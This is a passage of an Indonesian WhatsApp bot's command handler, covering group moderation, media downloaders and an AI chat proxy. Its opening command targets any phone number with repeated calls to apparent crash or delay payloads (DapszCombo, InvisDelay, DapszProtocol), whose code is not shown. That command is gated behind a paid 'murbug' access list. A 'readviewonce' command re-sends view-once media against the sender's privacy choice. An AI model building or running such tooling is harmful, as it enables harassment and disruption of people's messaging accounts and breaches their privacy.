return await gon.sendMessage(m.chat, { text: `Example: .${command} 628xxx` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await prosesress();

await DapszCombo(org)
await DapszCombo(org)
await sleep(7000)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await InvisDelay(org)
await sleep(7000)
await DapszProtocol(org)
await DapszProtocol(org)
await DapszProtocol(org)
await DapszProtocol(org)
await sleep(4000)

await doneress();
}
break
case 'addprem': case 'addmurbug': {
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
dappsz = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await gon.onWhatsApp(dappsz)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
premium.push(dappsz)
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium))
m.reply(`number ${dappsz} succesfully added to database!!`)
    }
break
case 'hidetag': case 'h': case "ht": {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				gon.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: fkontak })
			}
			break
case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return m.reply(mess.group)
				let response = await gon.groupInviteCode(m.chat)
				await gon.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await gon.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: fkontak });
}
break
case 'addowner':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} number\nContoh ${prefix+command} 62xxx`)
dappsz = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await gon.onWhatsApp(dappsz)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
owner.push(dappsz)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
m.reply(`number ${dappsz} succesfully added to database!!`)
break
case 'delmurbug':case 'delprem':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
kntl = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(kntl)
premium.splice(unp, 1)
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium))
m.reply(`succesfully deleted number ${kntl}`)
break
case 'delown':case 'delowner':
if (!isOwner) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Use ${prefix+command} Nomor\nContoh ${prefix+command} 62xxx`)
kntl = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(kntl)
owner.splice(unp, 1)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(owner))
m.reply(`succesfully deleted number ${kntl}`)
break

case 'public': {
if (!isOwner) return m.reply('Khusus Owner') 
gon.public = true
m.reply('Sukses Change To Public')
}
break

case 'self': {
if (!isOwner) return m.reply('Khusus Owner') 
gon.public = false
m.reply('Sukses Change To Self')
}
break

case'kick': case "yatim": {

if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isCreator) return replyWithCh('Khusus Admin!!')
if (!isBotAdmins) return replyWithCh('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!text) return replyWithCh('contoh .kick @tag')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gon.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyWithCh(`sukses kak`)
}
break

case 'venice': case 'veniceai': {
if (!text) return m.reply('Contoh: .venice apa itu AI?');
gon.sendMessage(m.chat, { react: { text: '💗', key: m.key }});
try {
const axios = require('axios');
const { data } = await axios.request({
method: 'POST',
url: 'https://outerface.venice.ai/api/inference/chat',
headers: {
accept: '*/*',
'content-type': 'application/json',
origin: 'https://venice.ai',
referer: 'https://venice.ai/',
'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
'x-venice-version': 'interface@20250523.214528+393d253'
},
data: JSON.stringify({
requestId: 'nekorinn',
modelId: 'dolphin-3.0-mistral-24b',
prompt: [
{
content: text,
role: 'user'
}
],
systemPrompt: '',
conversationType: 'text',
temperature: 0.8,
webEnabled: true,
topP: 0.9,
isCharacter: false,
clientProcessingTime: 15
})
});
const chunks = data.split('\n').filter(v => v).map(v => JSON.parse(v));
const hasil = chunks.map(v => v.content).join('');
gon.sendMessage(m.chat, { text: hasil }, { quoted: m });
} catch (e) {
console.error(e.message);
gon.sendMessage(m.chat, { text: 'Maaf, tidak ada hasil dari Venice.' }, { quoted: m });
}
}
break

case'userjid': {

          	if(!isCreator) return replyWitCh('Hanya Khusus Creator jadi lu jan so asik')
        const groupMetadata = m.isGroup ? await gon.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `🗿 ${mem.id}\n`
        }
      replyWithCh('Kok gak bisa user jid nya? ')
    }
    break

case'join': {

if (!isCreator) return replyWithCh(mess.owner)
if (!text) return replyWithCh(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyWithCh('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await gon.groupAcceptInvite(result)
await replyWithCh(`sukses kak`)
}
break

case'setwelcome': {

      if (!m.isGroup) return m.reply("❌ Cuma bisa dipake di grup.")

  let config = loadConfig();
  if (!config[m.chat]) {
    config[m.chat] = {
      welcome: false,
      message: "Selamat datang @user di @grup!\n@desk",
      buttons: [
        { buttonId: ".intro", buttonText: "Perkenalan" },
        { buttonId: ".rules", buttonText: "Aturan" }
      ]
    };
    saveConfig(config);
  }

  if (text.includes("--msg")) {
    let newMessage = text.split("--msg")[1]?.trim();
    if (!newMessage)return reply(`📢 Cara ubah pesan welcome:\nKetik:\n.setwelcome msg Selamat datang @user di @grup! @desk\n\nFormat :\n    🔹 \`@user\` = Nama pengguna\n    🔹 \`@grup\` = Nama grup\n    🔹 \`@desk\` = Deskripsi grup`);
    config[m.chat].message = newMessage;
    saveConfig(config);
    return m.reply(`✅ Pesan welcome diubah:\n\`\`\`\n${newMessage}\n\`\`\``)
  } 
  else if (text.includes("--button")) {
    let buttonArgs = text.split("--button")[1]?.trim();
    if (!buttonArgs) return reply(`📢 Cara ubah tombol welcome:\n.setwelcome --button .intro|Card Intro, .tutor|Tutorial`);

    
    if (buttons.length < 2) return m.reply("⚠️ Minimal harus ada 2 tombol!");

    config[m.chat].buttons = buttons;
    saveConfig(config);
    return m.reply("✅ Button welcome berhasil diubah!");
  } 
  else if (text.includes("--on")) {
    config[m.chat].welcome = true;
    saveConfig(config);
    return m.reply("✅ Welcome diaktifkan untuk grup ini!");
  } 
  else if (text.includes("--off")) {
    config[m.chat].welcome = false;
    saveConfig(config);
    return m.reply("🚫 Welcome dimatikan untuk grup ini!");
  }

  return m.reply(`⚙️ *Pengaturan Welcome*\n\nGunakan perintah ini:\n
- *${prefix}setwelcome --on* ➝ Aktifkan welcome  
- *${prefix}setwelcome --off* ➝ Matikan welcome  
- *${prefix}setwelcome --msg [pesan]* ➝ Ubah pesan welcome  
  - Gunakan:  
    🔹 \`@user\` = Nama pengguna  
    🔹 \`@grup\` = Nama grup  
    🔹 \`@desk\` = Deskripsi grup  
  - Contoh:  
    \`.setwelcome --msg Selamat datang @user di @grup! @desk\`
- *${prefix}setwelcome --button [cmd|label, cmd|label]* ➝ Ubah tombol  
  - Contoh:  
    \`.setwelcome --button .intro|Card Intro, .tutor|Tutorial\`
  `);
}

break


case'igdl': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {

if (!text) return replyWithCh(`Contoh: ${prefix + command} link`);
gon.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  
  try {
    let media = await (await fetch(`https://endpoint.web.id/downloader/instagram?key=${global.key}&url=${text}`)).json();
    let data = media.result;
    
    if (data.videoUrl) {
      await gon.sendMessage(m.chat, { 
        video: { url: data.videoUrl }, 
        caption: 'success kak',
        mimetype: 'video/mp4' 
      }, { quoted: m });
    } else if (data.imageUrl) {
      await gon.sendMessage(m.chat, { 
        image: { url: data.imageUrl }, 
        caption: 'success kak',
        mimetype: 'image/jpeg' 
      }, { quoted: m });
    } else {
      replyWithCh('Media tidak ditemukan!');
    }
  } catch (e) {
    m.reply(e.message);
    console.log(e);
  }
}
break

 case 'getcase':
if (!isCreator) return reply(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("case.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replyWithCh(`${getCase(q)}`)
break 
  
  case'demote': {

if (!m.isGroup) return replyWithCh(mess.group)
if (!isAdmins && !isCreator) return replyWithCh('Khusus Admin!!')
if (!isBotAdmins) return replyWithCh('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await gon.groupParticipantsUpdate(m.chat, [users], 'demote')
await replyWithCh(`sukses kak`)
}
break

case'promote':
        if (!m.isGroup) return m.reply(mess.group);
if (!isAdmins && !isCreator) return m.reply('Khusus Admin!!')
if (!isBotAdmins) return m.reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
        let blockwwwww = m.mentionedJid[0]
          ? m.mentionedJid[0]
          : m.quoted
          ? m.quoted.sender
          : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await gon
          .groupParticipantsUpdate(m.chat, [blockwwwww], "promote")
        break
        
     case'runtime': {

            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(os.uptime())}*`
replyWithCh(lowq)
            	}
            break 
            case'reportbug': case "lapor-kendala": {

  gon.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	if (!text) return replyWithCh(`Contoh : ${
        prefix+command}
       hola dev masih ada fitur yang blom di fix`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hai ${pushname}, Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
            for (let i of owner) {
gon.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            gon.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break
            
     case 'onlygc': {
    if (!isOwner) return m.reply('Fitur ini hanya untuk owner!');
    if (!args[0]) return m.reply(`Contoh: ${prefix + command} on/off`);

    const configPath = './config.js';
    const configText = fs.readFileSync(configPath, 'utf8');

    let newValue;
    if (args[0].toLowerCase() === 'on') {
        newValue = 'true';
    } else if (args[0].toLowerCase() === 'off') {
        newValue = 'false';
    } else {
        return m.reply(`Contoh: ${prefix + command} on/off`);
    }

    // Update nilai global.onlygrub
    const updatedConfig = configText.replace(/global\.onlygrub\s*=\s*(true|false)/, `global.onlygrub = ${newValue}`);
    fs.writeFileSync(configPath, updatedConfig);

    return m.reply(`✅ OnlyGroup berhasil diubah ke *${args[0].toLowerCase()}*!`);
}
break;       
            
        
case 'play2': case 'play': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');


replyWithCh(global.mess.wait)
  try {
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API utama gagal');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('Respon API utama tidak valid');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await gon.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
      await gon.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return m.reply('Gagal mengambil data dari server cadangan.');
        const json = await res2.json();
        if (!json.status || !json.result) return m.reply('Lagu tidak ditemukan!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();
        await gon.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        m.reply('Terjadi kesalahan saat memproses permintaanmu.');
      }
    }
  }
}
break

case'tiktok': case 'tt': {

 let momok = "`𝗧𝗜𝗞𝗧𝗢𝗞-𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗`"
if (!text.startsWith("https://"))  return replyWithCh("example \n*`.tiktok url`*")
await tiktokDl(q).then(async (result) => {
await gon.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return replyWithCh("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: gon.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*TIKTOK - DOWNLOADER*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await gon.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")

await gon.sendMessage(m.chat,{
			 video: {url:urlVid.url},
					caption: "Gonzz dl ttk",
					footer: `\n${global.namabot}`,
					buttons: [
						{
							buttonId: `.ttaudio ${text}`,
							buttonText: {
								displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});
}
}).catch(e => console.log(e))
await gon.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break

case 'ytdown': case 'ytdl': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return replyWithCh(`Contoh:\n.ytdown https://youtu.be/xxxx,720\n\nList Resolusi:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return replyWithCh(`❌ URL YouTube tidak valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return replyWithCh(`❌ Quality tidak valid!\nContoh: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await gon.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Judul:* ${meta.title}\n📥 *Tipe:* MP4\n🎚️ *Kualitas:* ${meta.quality}p\n\nSedang mengirim file...`,
    }, { quoted: m });
    await gon.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return replyWithCh(`❌ Gagal memulai proses download`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    m.reply('⏳ Sedang memproses video, mohon tunggu...');
    do {
      if (attempts >= maxTry) return replyWithCh(`❌ Timeout, proses terlalu lama!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return m.reply(`❌ Gagal mendapatkan link download`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return replyWithCh(`❌ Terjadi error: ${e.message || 'errn'}`);
  }
}
break
case 'loding': {
    await loading(gon, m)
    }
    break
    case 'getpp':{
     if(!text) return replyWithCh('*Format Salah 🗿*\n\n*`example .getpp @tag / +62`*');
      
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let memek = userss
	try {
   var kontol = await gon.profilePictureUrl(memek, 'image')
} catch (err) {
   var kontol = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
gon.sendMessage(from, { image: { url: kontol }}, { quoted: m })
}
break
    case  'bot': {
    const loadingSteps = [
        '⏳ M',
        '⏳ Me',
        '⏳ Memu',
        '⏳ Memul',
        '⏳ Memulai bot',
        '✨ Bot aktif dan responsif.',
    ];

    const finalText = '✅ Bot aktif dan responsif.';
await gon.sendMessage(m.chat, { react: { text: '👍', key: m.key }})
    let msg = await gon.sendMessage(m.chat, { text: loadingSteps[0] }, { quoted: m });

    for (let i = 1; i < loadingSteps.length; i++) {
        await sleep(120); 
        await gon.sendMessage(m.chat, {
            text: loadingSteps[i],
            edit: msg.key
        });
    }

    await sleep(600);
    await gon.sendMessage(m.chat, {
        text: finalText,
        edit: msg.key
    });
}
    break
    
case "tqto": {
    let anjayy = `
    *Thanks To*
    Allah Swt (MY God)
    Ortu (My Family)
    Gx Dikzz xD (Developer)
    `
    await gon.sendMessage(m.chat, {
    footer: `Powered By gonOfficial `,
        buttons: [
    {
      buttonId: `.menu`,
      buttonText: { displayText: 'Back To Menu' },
      type: 1
    }
      ],
        image: { url: 'https://files.catbox.moe/dv9ree.jpg' },
    caption: anjayy
  }, { quoted: text });
}
        break
       case 'pindl': {
    if (!text) return m.reply(`Contoh: .pindl linknya`);

    async function pindl(url) {
        try {
            const response = await axios.get(url, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                }
            });

            const $ = cheerio.load(response.data);
            const title = $('meta[property="og:title"]').attr('content') || '-';
            const description = $('meta[name="description"]').attr('content') || '-';
            const uploaded = $('meta[property="og:updated_time"]').attr('content') || '-';
            const height = $('meta[property="og:image:height"]').attr('content') || '-';
            const width = $('meta[property="og:image:width"]').attr('content') || '-';
            const fullsource = $('meta[property="pinterestapp:pinboard"]').attr('content') || '-';
            const source = fullsource ? new URL(fullsource).hostname : '-';

            const { data } = await axios.get(url);
            const img = [];
            const $$ = cheerio.load(data);
            $$('img').each((i, el) => {
                const src = $$(el).attr('src');
                if (src && src.startsWith('http')) img.push(src);
            });

            return {
                title,
                description,
                uploaded,
                height,
                width,
                source,
                fullsource,
                url,
                img,
            };
        } catch (e) {
            console.error(e);
            return null;
        }
    }

    const data = await pindl(text);
    if (!data || data.img.length === 0) return m.reply('Gagal mengambil gambar atau data.');

    const teks = `*Judul:* ${data.title}
*Deskripsi:* ${data.description}
*Diupload:* ${data.uploaded}
*Ukuran:* ${data.width}x${data.height}
*Sumber:* ${data.source}`;

    await gon.sendMessage(m.chat, {
        image: { url: data.img[0] },
        caption: teks
    }, { quoted: m });
}
break 
case  'animbrat': {
        if (text.startsWith('. animbrat') || text.startsWith('. Animbrat')) {
            return reply('Jangan ada spasi antara titik dan brat!!');
        }
    
        const fngsi = `https://fastrestapis.fasturl.cloud/maker/animbrat?text=${encodeURIComponent(q.trim())}&position=center&mode=image`;

       replyWithCh(global.mess.wait)
        
        try {
            // Coba akses API Clairity
            const response = await axios.get(fngsi, { responseType: 'arraybuffer' });
            await gon.sendImageAsSticker(m.chat, response.data, m, {
                packname: global.namabot,
                author: global.footer
            });
            
    
            } catch (err) {
            m.reply('yah eror coba lain waktu')
            }
            }
            break
    case 'spotify': {    

  const spotifyUrl = text;

  replyWithCh('Tunggu sebentar...');

  try {

    const encodedUrl = encodeURIComponent(spotifyUrl);

    const api = `https://ytdlpyton.nvlgroup.my.id/spotify/download/audio?url=${encodedUrl}&mode=url`;

    const { data } = await axios.get(api);

    if (!data || !data.download_url) {

      replyWithCh("Gagal mendapatkan data dari API.");

      return;

    }

    const { title, artist, thumbnail, download_url } = data;

    let doc = {

      audio: {

        url: download_url

      },

      mimetype: 'audio/mpeg',

      waveform: [100, 0, 100, 0, 100, 0, 100],

      fileName: `${title}.mp3`,

      contextInfo: {

        mentionedJid: [m.sender],

        externalAdReply: {

          mediaType: 1,

          renderLargerThumbnail: true

        }

      }

    };

    await gon.sendMessage(from, doc, { quoted: m });

                

  } catch (error) {

    console.error("Error:", error);

    replyWithCh("Terjadi kesalahan saat mengakses API Spotify.");

  }

}
break;        
            

case 'rvo':

case 'readviewonce': {

    if (!m.quoted) return replyWithCh(`Balas pesan viewonce dengan caption .rvo`);

    

    try {

        const quoted = m.quoted;

        const media = await quoted.download();

        const type = quoted.mtype;

        if (type === 'videoMessage') {

            await gon.sendMessage(m.chat, {

                video: media,

                caption: `_Berhasil membuka pesan viewonce_`,

                mimetype: 'video/mp4'

            }, { quoted: m });

        } else if (type === 'imageMessage') {

            await gon.sendMessage(m.chat, {

                image: media,

                caption: `_Berhasil membuka pesan viewonce_`

            }, { quoted: m });

        } else {

            replyWithCh('Jenis pesan viewonce tidak dikenali.');

        }

    } catch (err) {

        console.error('Error buka viewonce Coba lain Kali', err.message);

        replyWithCh('Gagal membuka pesan viewonce. Mungkin view once sudah dilihat oleh bot');

    }

    break;

}
        
default:
}
} catch (err) {
console.log(util.format(err))
}
}

//~~~~~Status Diperbarui~~~~~//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Berhasil Meng Update ${__filename}`)
delete require.cache[file]
require(file)
})
